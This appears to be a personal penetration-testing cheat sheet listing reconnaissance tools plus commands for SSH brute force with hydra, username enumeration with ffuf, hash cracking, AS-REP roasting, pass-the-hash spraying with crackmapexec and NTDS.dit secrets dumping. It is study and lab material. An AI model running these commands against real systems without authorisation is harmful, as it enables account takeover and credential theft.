##Image OSINT
- ''exiftool''
- google image search - reverse-search images

## Website
  - whois
  - [BuiltWith](https://builtwith.com)
  - [crt.sh](https://crt.sh/)
  - [Shodan](https://shodan.io)
  - [Wayback Machine](https://web.archive.org/)
  - [Wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)
	    
## Subdomains:
  - sublist3r
  - theHarvester
    - theHarvester -d website.com -b all -l 500
        - limits to 500 searches
  - recon.ng
  - [Subfinder](https://github.com/projectdiscovery/subfinder)
  - [Assetfinder](https://github.com/tomnomnom/assetfinder)
  - [httprobe](https://github.com/tomnomnom/httprobe)
  - [Amass](https://github.com/OWASP/Amass)
  - [crt.sh](https://crt.sh/)

## Email Addresses
- Username enumeration
  - Go to the sites, find names
  - **username-anarchy** 
  - `./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt'
  - **theHarvester**
    - theHarvester -d tesla.com -b all -l 500  
    - whatsmyname -u username

## Passwords
  - Dehashed
  - [HaveIbeenpwnd](https://haveibeenpwned.com/)
  - **cewl** - pulls words from a site that can be used as a password
  - Burpsuite to intercept and attempt logins
		- **python-exrex** permutates common default PWs schemas 
  - Brute force: 
    - hydra
	    - hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -V
		- 4 is 4 threads
		  - -V is for verbosity
    - FUFF
      - `ffuf -w /usr/share/wordlists/seclists/SecLists-master/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://0.0.0.0/loginportallocation/signup -mr "error message such as username already exists"
      - -x is the request method
	      - this will normally be a GET request but can be a POST request
      - -d is the data were sending
	      - ie username, email, password and cpassword
		    - if were only getting the username here we put FUZZ after username and x for the others
    - -H adds headers to the request
	  - -mr adds the error info
    - -u is the url location
    - can add >> validusernames.txt at the end for it to put them in a file for you


## Hash Cracking
**Hash Identifier**
- `hash-identifier` - built in Kali tool to check hashed passwords

**hashcat** 
- `hashcat -m 0 {hash file} /usr/share/wordlists/rockyou.txt`

**Johntheripper**
- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt bluehashes.txt
- Can save the hash into a file called hash and use John the Ripper with rockyou
- `john hash --format=krb5asrep
- update above to be whatever hash format, this is for kerberos
- another john example:
	- `john hash --fork=4 -w=/home/user/rockyou.txt
	- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

**Check out account lockout policy:**
- `ldapsearch -D 'DOMAIN\support' -w '#00^Domain' -p 389 -h 0.0.0.0 - b "dc=domain,dc=local" -s sub "*" | grep lockoutThreshold
- lockout threshold of 0 means unlimited

**Get Hash:**
- Impacket can be used to request a TGT
	- `GetNPUsers.py domain.local/username -dc-ip 10.10.10.161 -no-pass

**With Hashes:** 
- Spray with crackmap:
	- `cme smb 10.10.10.192 -u users -H hashes
	- this will spit out any working username: password

**Secrets dump:**
- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
